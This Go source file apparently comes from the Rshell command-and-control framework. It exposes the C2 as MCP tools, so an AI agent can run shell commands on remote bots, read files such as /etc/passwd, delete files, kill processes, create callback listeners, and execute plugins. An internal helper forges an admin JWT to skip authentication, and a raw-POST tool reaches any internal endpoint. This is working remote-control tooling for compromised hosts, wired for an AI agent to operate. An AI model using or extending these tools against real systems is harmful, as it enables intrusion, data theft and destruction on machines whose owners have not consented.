package mcp

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http/httptest"
	"net/url"
	"strings"

	"Rshell/pkg/common"
	"Rshell/pkg/database"
	"Rshell/pkg/logger"

	"github.com/gin-gonic/gin"
	"github.com/mark3labs/mcp-go/mcp"
	"github.com/mark3labs/mcp-go/server"
)

var MCPServer *server.MCPServer
var SSEServer *server.SSEServer

// GlobalEngine references the main gin.Engine instance. It allows MCP to route requests securely inside the same process.
var GlobalEngine *gin.Engine

// localApiCall 内部调用对应的HTTP路由（免除了网络请求和JWT校验的问题）
func localApiCall(method, path string, q map[string]string, body interface{}) (string, error) {
	if GlobalEngine == nil {
		message := "GlobalEngine not set. Notice: If you run mcp as a standalone process (e.g. 'rshell mcp'), many tasks requiring channel communications might time out. Please use the SSE endpoint included in the main C2 service instead for full capability."
		logger.Warn(message)
		return "", fmt.Errorf("%s", message)
	}

	if len(q) > 0 {
		values := url.Values{}
		for k, v := range q {
			values.Add(k, v)
		}
		if strings.Contains(path, "?") {
			path += "&" + values.Encode()
		} else {
			path += "?" + values.Encode()
		}
	}

	var reqBody io.Reader
	if body != nil {
		b, err := json.Marshal(body)
		if err == nil {
			reqBody = bytes.NewReader(b)
		}
	}

	req := httptest.NewRequest(method, path, reqBody)
	req.Header.Set("Content-Type", "application/json")

	// 生成一个管理员 JWT Token 以绕过 AuthMiddleware 校验
	token, _ := common.GenerateJWT("admin")
	req.Header.Set("Token", "Bearer "+token)

	w := httptest.NewRecorder()
	GlobalEngine.ServeHTTP(w, req)

	return w.Body.String(), nil
}

// resolveClientUID helps finding a client by partial UID, IP, Note, or ID to make MCP easier to use.
func resolveClientUID(target string) (string, error) {
	var clients []database.Clients
	err := database.Engine.Find(&clients)
	if err != nil {
		return "", err
	}

	var matches []database.Clients
	for _, c := range clients {
		if c.Uid == target || strings.HasPrefix(c.Uid, target) || c.InternalIP == target || c.ExternalIP == target || c.Note == target {
			matches = append(matches, c)
		}
	}

	if len(matches) == 0 {
		return "", fmt.Errorf("no client found matching '%s'", target)
	}
	if len(matches) > 1 {
		return "", fmt.Errorf("multiple clients found matching '%s', please be more specific (e.g. use full UID)", target)
	}
	return matches[0].Uid, nil
}

func InitMCP() {
	MCPServer = server.NewMCPServer("rshell-mcp", "1.1.0")
	logger.Info("InitMCP: Starting MCP Server...")

	// ---------------------------------------------------------
	// Client 相关工具
	// ---------------------------------------------------------

	MCPServer.AddTool(mcp.NewTool("list_clients",
		mcp.WithDescription("List all active and inactive remote clients/bots. (Note: Online=\"1\" means Online, Online=\"2\" means Offline)"),
		mcp.WithString("page", mcp.Description("Page number (default: 1)")),
		mcp.WithString("pageSize", mcp.Description("Number of items per page (default: 100)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments
		if args == nil {
			args = make(map[string]interface{})
		}
		argsMap := args.(map[string]interface{})
		page := "1"
		if val, ok := argsMap["page"]; ok {
			page = fmt.Sprintf("%v", val)
		}
		pageSize := "100"
		if val, ok := argsMap["pageSize"]; ok {
			pageSize = fmt.Sprintf("%v", val)
		}

		resp, err := localApiCall("GET", "/api/client/clientslist", map[string]string{"page": page, "page_size": pageSize}, nil)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("send_command",
		mcp.WithDescription("Send a shell command to a remote client by UID, IP, or Note."),
		mcp.WithString("target", mcp.Required(), mcp.Description("The target client (UID, part of UID, Internal IP, External IP, or Note)")),
		mcp.WithString("command", mcp.Required(), mcp.Description("The shell command to execute (e.g. whoami, id)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		uid, err := resolveClientUID(args["target"].(string))
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

		cmd := args["command"].(string)
		if !strings.HasPrefix(cmd, "shell ") {
			cmd = "shell " + cmd
		}

		resp, err := executeCommandSync(uid, cmd)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("get_shell_content",
		mcp.WithDescription("Get the shell history and output from a specific client."),
		mcp.WithString("target", mcp.Required(), mcp.Description("The target client (UID, part of UID, Internal IP, External IP, or Note)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		uid, err := resolveClientUID(args["target"].(string))
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

		resp, err := localApiCall("GET", "/api/client/shell/getshellcontent", map[string]string{"uid": uid}, nil)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("get_target_processes",
		mcp.WithDescription("Get the active process list (ps) on the target client."),
		mcp.WithString("target", mcp.Required(), mcp.Description("The target client (UID, part of UID, Internal IP, External IP, or Note)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		uid, err := resolveClientUID(args["target"].(string))
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

		resp, err := localApiCall("GET", "/api/client/pid", map[string]string{"uid": uid}, nil)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("kill_pid",
		mcp.WithDescription("Kill a specific process by PID on the target client."),
		mcp.WithString("target", mcp.Required(), mcp.Description("The target client (UID, part of UID, Internal IP, External IP, or Note)")),
		mcp.WithString("pid", mcp.Required(), mcp.Description("The PID to kill")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		uid, err := resolveClientUID(args["target"].(string))
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

		body := map[string]interface{}{"uid": uid, "pid": args["pid"].(string)}
		resp, err := localApiCall("POST", "/api/client/pid/kill", nil, body)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("target_file_browse",
		mcp.WithDescription("Browse the remote file system of the target client."),
		mcp.WithString("target", mcp.Required(), mcp.Description("The target client (UID, part of UID, Internal IP, External IP, or Note)")),
		mcp.WithString("dirPath", mcp.Required(), mcp.Description("Directory path to browse (e.g., / or C:\\)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		uid, err := resolveClientUID(args["target"].(string))
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

		body := map[string]interface{}{"uid": uid, "dirPath": args["dirPath"].(string)}
		resp, err := localApiCall("POST", "/api/client/file/tree", nil, body)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("file_delete",
		mcp.WithDescription("Delete a file on the target client."),
		mcp.WithString("target", mcp.Required(), mcp.Description("The target client (UID, part of UID, Internal IP, External IP, or Note)")),
		mcp.WithString("fileName", mcp.Required(), mcp.Description("Absolute file path to delete (e.g., /tmp/test.txt)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		uid, err := resolveClientUID(args["target"].(string))
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

		body := map[string]interface{}{"uid": uid, "filePath": args["fileName"].(string)}
		resp, err := localApiCall("POST", "/api/client/file/delete", nil, body)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("make_dir",
		mcp.WithDescription("Create a new directory on the target client."),
		mcp.WithString("target", mcp.Required(), mcp.Description("The target client (UID, part of UID, Internal IP, External IP, or Note)")),
		mcp.WithString("dirName", mcp.Required(), mcp.Description("Absolute path of the directory to create (e.g., /tmp/newdir)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		uid, err := resolveClientUID(args["target"].(string))
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

		body := map[string]interface{}{"uid": uid, "dirPath": args["dirName"].(string)}
		resp, err := localApiCall("POST", "/api/client/file/mkdir", nil, body)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("edit_client_note",
		mcp.WithDescription("Edit the note of a specific client."),
		mcp.WithString("target", mcp.Required(), mcp.Description("The target client (UID, part of UID, Internal IP, External IP, or Note)")),
		mcp.WithString("note", mcp.Required(), mcp.Description("The content of the note")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		uid, err := resolveClientUID(args["target"].(string))
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

		body := map[string]interface{}{"uid": uid, "noteContent": args["note"].(string)}
		resp, err := localApiCall("POST", "/api/client/note/save", nil, body)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("get_client_note",
		mcp.WithDescription("Get the note of a specific client."),
		mcp.WithString("target", mcp.Required(), mcp.Description("The target client (UID, part of UID, Internal IP, External IP, or Note)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		uid, err := resolveClientUID(args["target"].(string))
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

		resp, err := localApiCall("GET", "/api/client/note/get", map[string]string{"uid": uid}, nil)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("fetch_file_content",
		mcp.WithDescription("Read the content of a file from the target client's disk."),
		mcp.WithString("target", mcp.Required(), mcp.Description("The target client (UID, part of UID, Internal IP, External IP, or Note)")),
		mcp.WithString("filePath", mcp.Required(), mcp.Description("Absolute file path to read (e.g., /etc/passwd or C:\\temp\\info.txt)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		uid, err := resolveClientUID(args["target"].(string))
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

		body := map[string]interface{}{"uid": uid, "path": args["filePath"].(string)}
		resp, err := localApiCall("POST", "/api/client/file/filecontent", nil, body)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("exit_client",
		mcp.WithDescription("Disconnect/Exit the target client cleanly."),
		mcp.WithString("target", mcp.Required(), mcp.Description("The target client (UID, part of UID, Internal IP, External IP, or Note)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		uid, err := resolveClientUID(args["target"].(string))
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

		resp, err := localApiCall("GET", "/api/client/exit", map[string]string{"uid": uid}, nil)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	// ---------------------------------------------------------
	// Listener 相关工具
	// ---------------------------------------------------------

	MCPServer.AddTool(mcp.NewTool("list_listeners",
		mcp.WithDescription("List all listeners configured on the C2 server. (Note: Status 1 = Running, Status 2 = Stopped)"),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		resp, err := localApiCall("GET", "/api/listener/list", nil, nil)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("add_listener",
		mcp.WithDescription("Add a new listener to the C2 server."),
		mcp.WithString("type", mcp.Required(), mcp.Description("Listener Type. Supported values: 'websocket', 'tcp', 'kcp', 'http', 'oss'")),
		mcp.WithString("listenAddress", mcp.Required(), mcp.Description("Address to bind (e.g. 0.0.0.0:80 or 0.0.0.0:443)")),
		mcp.WithString("connectAddress", mcp.Required(), mcp.Description("Address payload will connect back to (e.g. 127.0.0.1:80)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		body := map[string]string{
			"type":           args["type"].(string),
			"listenAddress":  args["listenAddress"].(string),
			"connectAddress": args["connectAddress"].(string),
		}
		resp, err := localApiCall("POST", "/api/listener/add", nil, body)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("open_listener",
		mcp.WithDescription("Start/Open a currently stopped listener."),
		mcp.WithString("listenAddress", mcp.Required(), mcp.Description("Address it is bound to (e.g. 0.0.0.0:80)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		body := map[string]string{
			"listenAddress": args["listenAddress"].(string),
		}
		resp, err := localApiCall("POST", "/api/listener/open", nil, body)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("close_listener",
		mcp.WithDescription("Stop/Close a currently running listener."),
		mcp.WithString("listenAddress", mcp.Required(), mcp.Description("Address it is bound to (e.g. 0.0.0.0:80)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		body := map[string]string{
			"listenAddress": args["listenAddress"].(string),
		}
		resp, err := localApiCall("POST", "/api/listener/close", nil, body)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("delete_listener",
		mcp.WithDescription("Delete an existing listener."),
		mcp.WithString("type", mcp.Required(), mcp.Description("Listener Type. Supported values: 'websocket', 'tcp', 'kcp', 'http', 'oss'")),
		mcp.WithString("listenAddress", mcp.Required(), mcp.Description("Address it is bound to (e.g. 0.0.0.0:80)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		body := map[string]string{
			"type":          args["type"].(string),
			"listenAddress": args["listenAddress"].(string),
		}
		resp, err := localApiCall("POST", "/api/listener/delete", nil, body)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	// ---------------------------------------------------------
	// Settings & Plugin & WebDelivery & Socks5 工具
	// ---------------------------------------------------------

	MCPServer.AddTool(mcp.NewTool("list_settings",
		mcp.WithDescription("List global settings and configuration from C2 database."),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		resp, err := localApiCall("GET", "/api/settings/list", nil, nil)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("edit_settings",
		mcp.WithDescription("Edit a global setting."),
		mcp.WithString("name", mcp.Required(), mcp.Description("Setting name (e.g. TelegramBotToken)")),
		mcp.WithString("value", mcp.Required(), mcp.Description("Setting value")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		body := []map[string]string{
			{
				"name":  args["name"].(string),
				"value": args["value"].(string),
			},
		}
		resp, err := localApiCall("POST", "/api/settings/edit", nil, body)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("list_socks5",
		mcp.WithDescription("List active Socks5 proxies initiated by bots. (Note: Status 1 = Running, Status 2 = Stopped)"),
		mcp.WithString("target", mcp.Required(), mcp.Description("The target client (UID, part of UID, Internal IP, External IP, or Note)")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		uid, err := resolveClientUID(args["target"].(string))
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

		resp, err := localApiCall("GET", "/api/socks5/list", map[string]string{"uid": uid}, nil)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("list_web_delivery",
		mcp.WithDescription("List WebDelivery endpoints. (Note: Status 1 = Running, Status 2 = Stopped)"),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		resp, err := localApiCall("GET", "/api/webdelivery/list", nil, nil)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("list_plugins",
		mcp.WithDescription("List available plugins on the server."),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		resp, err := localApiCall("GET", "/api/plugin/list", nil, nil)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	MCPServer.AddTool(mcp.NewTool("execute_plugin",
		mcp.WithDescription("Execute a specific plugin task on the target client."),
		mcp.WithString("target", mcp.Required(), mcp.Description("The target client (UID, part of UID, Internal IP, External IP, or Note)")),
		mcp.WithString("pluginId", mcp.Required(), mcp.Description("Plugin ID to execute")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		uid, err := resolveClientUID(args["target"].(string))
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}

		pluginIdStr := args["pluginId"].(string)
		var pluginId int64
		fmt.Sscanf(pluginIdStr, "%d", &pluginId)

		body := map[string]interface{}{"uid": uid, "id": pluginId, "args": ""}
		resp, err := localApiCall("POST", "/api/plugin/execute", nil, body)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	// ---------------------------------------------------------
	// 万能网关回调（高级工具），以便执行那些未明确注册的临时接口
	// ---------------------------------------------------------
	MCPServer.AddTool(mcp.NewTool("advanced_http_post",
		mcp.WithDescription("Advanced: Send raw JSON payload to a specific POST endpoint."),
		mcp.WithString("path", mcp.Required(), mcp.Description("Relative internal API path (e.g. /api/forward-connection)")),
		mcp.WithString("bodyStr", mcp.Required(), mcp.Description("Raw JSON string payload")),
	), func(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		args := request.Params.Arguments.(map[string]interface{})
		path := args["path"].(string)
		bodyStr := args["bodyStr"].(string)

		var body map[string]interface{}
		if err := json.Unmarshal([]byte(bodyStr), &body); err != nil && bodyStr != "" {
			return mcp.NewToolResultError("Invalid JSON body string: " + err.Error()), nil
		}

		resp, err := localApiCall("POST", path, nil, body)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(resp), nil
	})

	SSEServer = server.NewSSEServer(
		MCPServer,
		server.WithMessageEndpoint("/api/mcp/message"),
		server.WithAppendQueryToMessageEndpoint(),
	)
}

// StartStdioServer ...
func StartStdioServer() {
	if GlobalEngine == nil {
		logger.Warn("StartStdioServer: Running in standalone stdio mode without an embedded web router. Some interactive channels will fail.")
	}
	logger.Info("StartStdioServer: Starting MCP Server in stdio mode...")
	if err := server.ServeStdio(MCPServer); err != nil {
		logger.Error(fmt.Sprintf("StartStdioServer failed: %v", err))
	}
}

// Middleware to check if MCP is enabled in settings
func MCPEnabledMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		var setting database.Settings
		has, err := database.Engine.Where("name = ?", "mcp_enabled").Get(&setting)
		if err != nil || !has || setting.Value != "true" {
			c.JSON(403, gin.H{"error": "MCP service is disabled in settings. Enable it in the Web UI."})
			c.Abort()
			return
		}
		c.Next()
	}
}

func HandleSSE(c *gin.Context) {
	logger.Info("HandleSSE: New MCP Client connected")
	SSEServer.SSEHandler().ServeHTTP(c.Writer, c.Request)
}

func HandleMessage(c *gin.Context) {
	logger.Info("HandleMessage: New MCP message received")
	SSEServer.MessageHandler().ServeHTTP(c.Writer, c.Request)
}
